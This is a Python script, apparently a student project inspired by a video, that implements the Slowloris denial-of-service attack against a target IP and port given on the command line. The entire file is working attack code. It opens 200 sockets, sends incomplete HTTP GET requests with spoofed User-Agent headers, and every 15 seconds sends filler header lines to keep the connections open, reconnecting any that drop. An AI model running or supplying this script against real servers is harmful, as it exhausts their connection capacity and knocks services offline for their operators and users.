"""
This python program is meant
to recreate the slow loris attack
described within the computer-phile video
discussing said program alongside the original
coders.  It is a form of DDOS unlike many others 
usually targetted at servers operating with multithreading
@author Sean Kannanaikal
"""

#importing necessary packages
import sys
import socket
import random
import time
import string

#A list of a variety of user-agent headers that could be found in an http get request in order to mimic the feel of multiple users searching up the site
STANDARD_GET_REQUEST_HEADERS = ["User-agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
                               "User-agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                               "User-agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
                               "User-agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
                               "User-agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
]

#a list meant to hold all the sockets which are connecting to the desired host
SOCKET_CONNECTIONS = []

"""
this method takes a socket from the list
of socket connections and then proceeds to
send a get request from it for all 5 headesr
in the request headers for user agents found
above
"""
def sendRequest():
    #looping through each socket
    for s in SOCKET_CONNECTIONS:
        #print some info for terminal output
        print(str(s.getsockname()) + " is sending GET REQUEST!") 
        s.send(str.encode("GET / HTTP/1.1\r\n"))#initiate the get request
        for header in STANDARD_GET_REQUEST_HEADERS:
            s.send(str.encode("{}\r\n".format(header))) # for all the user agents send them as well

"""
this method simply creates a socket connection
with the desired ip and port that is passed in
and then proceeds to append it to the socketconnections
list
"""
def create_connection(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    SOCKET_CONNECTIONS.append(s)

"""
this method actually initiates and
conducts the slow loris attack
"""
def initiateAttack(ip, port):
    #make 200 socket connections
    for _ in range(200):
        create_connection(ip, port)

    #have them all send a request
    sendRequest()

    while True:
        #have each socket connection try and send a little bit more data to keep connection open if it fails remove the socket from the list cause its probably closed
        for connection in SOCKET_CONNECTIONS:
            try:
                print(str(connection.getsockname()) + " is sending extra data!") 
                connection.send(str.encode("X-a: {}\r\n".format(random.choice(string.ascii_letters))))
            except socket.error:
                SOCKET_CONNECTIONS.remove(connection)
        
        #for the amount of missing sockets create x amount of new socket connections and have them all send get requests
        for _ in range(200 - len(SOCKET_CONNECTIONS)):
            create_connection(ip, port)

            sendRequest()

        #simple output for the terminal
        print("Socket Count: {0}".format(len(SOCKET_CONNECTIONS)))
        time.sleep(15) # wait 15 seconds 

"""
main mehtod for the program
"""
def main():
    #handling user input from terminal and then initiating the attack
    ip = sys.argv[1]
    port = sys.argv[2]
    initiateAttack(ip, int(port))

if __name__ == "__main__":
    main()